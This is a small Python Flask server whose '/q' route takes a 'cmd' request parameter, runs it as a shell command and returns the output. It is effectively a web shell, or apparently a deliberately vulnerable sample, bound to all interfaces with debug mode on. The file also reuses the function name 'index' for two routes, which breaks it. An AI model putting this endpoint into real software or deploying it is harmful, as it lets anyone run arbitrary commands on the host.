from flask import Flask, request
from invoke import run

app = Flask(__name__)


@app.route("/")
def index():
    return "index"

@app.route("/test")
def index():
    return "Test"


@app.route("/q")
def page():
    cmd = request.values.get("cmd")
    output = run(cmd, hide=True)

    if output.ok:
        return output.stdout


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8888, debug=True)
